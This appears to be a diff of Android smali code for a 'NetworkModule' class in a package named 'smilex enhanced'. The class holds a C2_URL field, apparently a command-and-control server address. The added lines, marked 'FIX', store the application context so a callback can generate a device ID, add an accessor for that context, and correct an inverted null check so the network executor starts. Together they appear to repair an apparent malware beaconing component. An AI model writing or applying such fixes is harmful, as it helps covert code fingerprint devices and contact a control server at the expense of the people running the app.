@@ -7,6 +7,8 @@
 .field private static final sPendingLock:Ljava/lang/Object; = null
 .field private static sExecutor:Ljava/util/concurrent/ExecutorService; = null
 .field private static sRetryCount:I = 0x3
+# FIX: Added sContext so NetworkModule$1 can call CryptoUtils.generateDeviceId(Context)
+.field private static sContext:Landroid/content/Context;
 
 .method public constructor <init>()V
     .registers 1
@@ -29,8 +31,13 @@
 
 .method public static init(Landroid/content/Context;)V
     .registers 4
+    # FIX: Store application context for use in NetworkModule$1
+    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
+    move-result-object v0
+    sput-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sContext:Landroid/content/Context;
+    # FIX: Inverted null check — only init executor if it is null (not already running)
     sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sExecutor:Ljava/util/concurrent/ExecutorService;
-    if-eqz v0, :return
+    if-nez v0, :return
     const/4 v0, 0x3
     invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;
     move-result-object v0
@@ -128,5 +135,12 @@
 .method static synthetic access$000()Ljava/lang/String;
     .registers 1
     sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->C2_URL:Ljava/lang/String;
+    return-object v0
+.end method
+
+# FIX: Synthetic accessor so NetworkModule$1 can read sContext
+.method static synthetic access$001()Landroid/content/Context;
+    .registers 1
+    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sContext:Landroid/content/Context;
     return-object v0
 .end method
